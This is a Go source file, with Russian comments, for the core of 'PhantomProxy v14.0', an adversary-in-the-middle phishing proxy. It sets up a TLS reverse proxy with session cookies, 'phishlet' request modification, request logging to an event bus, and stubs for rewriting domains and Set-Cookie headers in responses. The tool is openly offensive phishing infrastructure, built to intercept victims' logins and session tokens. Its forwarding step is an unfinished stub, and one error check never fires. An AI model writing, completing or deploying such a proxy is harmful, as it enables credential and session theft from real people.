// Package proxy - AiTM Core Engine for PhantomProxy v14.0
package proxy

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/httputil"
	"net/url"
	"sync"
	"time"

	"github.com/gofiber/fiber/v2"
	"go.uber.org/zap"
)

// Config - конфигурация proxy
type Config struct {
	BindAddr    string
	HTTPSPort   int
	HTTP3Port   int
	Domain      string
	CertPath    string
	KeyPath     string
	UpstreamURL *url.URL
	Debug       bool
}

// AiTMProxy - основной Adversary-in-the-Middle proxy
type AiTMProxy struct {
	mu           sync.RWMutex
	config       *Config
	logger       *zap.Logger
	reverseProxy *httputil.ReverseProxy
	fiber        *fiber.App
	tlsConfig    *tls.Config
	sessionMgr   *SessionManager
	phishletMgr  *PhishletManager
	eventBus     *EventBus
}

// NewAiTMProxy создает новый AiTM proxy
func NewAiTMProxy(cfg *Config, logger *zap.Logger) (*AiTMProxy, error) {
	// TLS конфигурация
	tlsConfig := &tls.Config{
		MinVersion:   tls.VersionTLS12,
		CipherSuites: getCipherSuites(),
	}

	// Reverse proxy
	reverseProxy := httputil.NewSingleHostReverseProxy(cfg.UpstreamURL)

	// Fiber app
	app := fiber.New(fiber.Config{
		ReadTimeout:      30 * time.Second,
		WriteTimeout:     30 * time.Second,
		IdleTimeout:      60 * time.Second,
		ReadBufferSize:   8192,
		WriteBufferSize:  8192,
		ReduceMemoryUsage: true,
		ErrorHandler:     errorHandler(logger),
	})

	proxy := &AiTMProxy{
		config:       cfg,
		logger:       logger,
		reverseProxy: reverseProxy,
		fiber:        app,
		tlsConfig:    tlsConfig,
	}

	// Setup middleware
	proxy.setupMiddleware()

	// Setup routes
	proxy.setupRoutes()

	return proxy, nil
}

// SetSessionManager устанавливает менеджер сессий
func (p *AiTMProxy) SetSessionManager(sm *SessionManager) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.sessionMgr = sm
}

// SetPhishletManager устанавливает менеджер фишлетов
func (p *AiTMProxy) SetPhishletManager(pm *PhishletManager) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.phishletMgr = pm
}

// SetEventBus устанавливает шину событий
func (p *AiTMProxy) SetEventBus(eb *EventBus) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.eventBus = eb
}

// Start запускает proxy сервер
func (p *AiTMProxy) Start(ctx context.Context) error {
	p.logger.Info("Starting AiTM Proxy",
		zap.String("domain", p.config.Domain),
		zap.Int("https_port", p.config.HTTPSPort),
		zap.Int("http3_port", p.config.HTTP3Port))

	// HTTPS server (HTTP/2)
	go func() {
		addr := fmt.Sprintf("%s:%d", p.config.BindAddr, p.config.HTTPSPort)
		p.logger.Info("Starting HTTPS server (HTTP/2)", zap.String("addr", addr))

		if err := p.fiber.ListenTLS(addr, p.config.CertPath, p.config.KeyPath); err != nil {
			p.logger.Error("HTTPS server failed", zap.Error(err))
		}
	}()

	// Wait for context
	<-ctx.Done()
	p.logger.Info("AiTM Proxy shutting down...")

	return p.Shutdown(ctx)
}

// Shutdown корректно останавливает proxy
func (p *AiTMProxy) Shutdown(ctx context.Context) error {
	p.mu.Lock()
	defer p.mu.Unlock()

	// Shutdown Fiber
	if err := p.fiber.ShutdownWithTimeout(10 * time.Second); err != nil {
		p.logger.Error("Fiber shutdown error", zap.Error(err))
	}

	p.logger.Info("AiTM Proxy stopped")
	return nil
}

// setupMiddleware настраивает middleware
func (p *AiTMProxy) setupMiddleware() {
	// Logging middleware
	p.fiber.Use(func(c *fiber.Ctx) error {
		start := time.Now()

		err := c.Next()

		p.logger.Debug("Request",
			zap.String("method", c.Method()),
			zap.String("path", c.Path()),
			zap.Int("status", c.Response().StatusCode()),
			zap.Duration("latency", time.Since(start)),
			zap.String("ip", c.IP()),
		)

		return err
	})

	// Recovery middleware
	p.fiber.Use(func(c *fiber.Ctx) error {
		defer func() {
			if r := recover(); r != nil {
				p.logger.Error("Panic recovered", zap.Any("error", r))
				c.Status(500).JSON(fiber.Map{
					"error": "Internal server error",
				})
			}
		}()
		return c.Next()
	})
}

// setupRoutes настраивает маршруты
func (p *AiTMProxy) setupRoutes() {
	// Все запросы через proxy
	p.fiber.All("/*", p.proxyHandler)
}

// proxyHandler - основной обработчик proxy
func (p *AiTMProxy) proxyHandler(c *fiber.Ctx) error {
	p.mu.RLock()
	sessionMgr := p.sessionMgr
	phishletMgr := p.phishletMgr
	eventBus := p.eventBus
	p.mu.RUnlock()

	// Логирование запроса
	p.logger.Info("Proxy request",
		zap.String("method", c.Method()),
		zap.String("path", string(c.Request().URI().Path())),
		zap.String("host", string(c.Request().Host())),
		zap.String("ip", c.IP()),
	)

	// Получить или создать сессию
	sessionID := c.Cookies("session_id")
	if sessionID == "" && sessionMgr != nil {
		var err error
		sessionID, _ = sessionMgr.Create(c.Context(), c.IP(), string(c.Request().URI().Host()))
		if err != nil {
			p.logger.Error("Failed to create session", zap.Error(err))
		} else {
			c.Cookie(&fiber.Cookie{
				Name:     "session_id",
				Value:    sessionID,
				HTTPOnly: true,
				Secure:   true,
				SameSite: "Strict",
			})
		}
	}

	// Модификация запроса (phishlet)
	if phishletMgr != nil {
		if err := phishletMgr.ModifyRequest(c, sessionID); err != nil {
			p.logger.Warn("Phishlet modify request error", zap.Error(err))
		}
	}

	// Проксирование запроса - заглушка
	p.logger.Warn("Proxy request forwarding not fully implemented")

	// Отправить событие
	if eventBus != nil {
		eventBus.Publish("proxy.request", map[string]interface{}{
			"session_id":  sessionID,
			"method":      c.Method(),
			"path":        c.Path(),
			"ip":          c.IP(),
			"timestamp":   time.Now(),
		})
	}

	return nil
}

// rewriteResponse перезаписывает домены в ответе
func (p *AiTMProxy) rewriteResponse(resp *http.Response) {
	// Заменить домены в Content-Type: text/*
	if ct := resp.Header.Get("Content-Type"); ct != "" {
		if isTextContentType(ct) {
			// TODO: Заменить домены из конфига
			// Пример: example.com -> phantom.local
		}
	}

	// Перезаписать Set-Cookie домены
	if cookies := resp.Header.Values("Set-Cookie"); len(cookies) > 0 {
		resp.Header.Del("Set-Cookie")
		for _, cookie := range cookies {
			// TODO: Заменить домен в cookie
			resp.Header.Add("Set-Cookie", cookie)
		}
	}
}

// errorHandler возвращает обработчик ошибок
func errorHandler(logger *zap.Logger) fiber.ErrorHandler {
	return func(c *fiber.Ctx, err error) error {
		logger.Error("Proxy error",
			zap.Error(err),
			zap.String("path", c.Path()),
			zap.String("method", c.Method()),
		)

		code := fiber.StatusInternalServerError
		if e, ok := err.(*fiber.Error); ok {
			code = e.Code
		}

		return c.Status(code).JSON(fiber.Map{
			"error":     http.StatusText(code),
			"message":   err.Error(),
			"path":      c.Path(),
			"timestamp": time.Now(),
		})
	}
}

// getCipherSuites возвращает безопасные cipher suites
func getCipherSuites() []uint16 {
	return []uint16{
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
	}
}

// isTextContentType проверяет текстовый ли Content-Type
func isTextContentType(ct string) bool {
	return ct == "text/html" ||
		   ct == "text/css" ||
		   ct == "text/javascript" ||
		   ct == "application/javascript" ||
		   ct == "application/json"
}
